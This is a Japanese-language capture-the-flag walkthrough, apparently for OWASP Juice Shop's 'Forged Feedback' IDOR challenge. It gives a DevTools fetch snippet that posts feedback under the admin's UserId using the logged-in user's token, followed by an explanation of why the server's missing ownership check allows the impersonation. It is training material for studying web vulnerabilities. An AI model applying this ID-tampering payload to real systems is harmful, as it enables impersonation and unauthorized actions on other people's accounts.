# Forged Feedback ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** IDOR
**目標:** 他のユーザーとしてフィードバックを送信する

---

## 実行手順

1. ログインする
2. DevToolsのConsoleで以下を実行:
   ```javascript
   fetch('/api/Feedbacks/', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({
       UserId: 1,  // admin のユーザーID
       comment: 'Forged feedback from admin',
       rating: 1,
       captchaId: 0,
       captcha: '0'
     })
   }).then(r => r.json()).then(console.log)
   ```

## 解説

- `UserId` を任意の値に設定できる
- 自分のIDではなく、他のユーザーのIDを指定
- サーバーが「このフィードバックは本当にこのユーザーからか？」を検証していない

**IDOR（Insecure Direct Object Reference）:**
- オブジェクトへの参照（ID）を改ざんして権限外の操作を行う
- ユーザーIDを変えることで、他人になりすまし

## 関連チャレンジ

- [View Basket](../difficulty-2/view-basket.md)
- [Forged Review](forged-review.md)
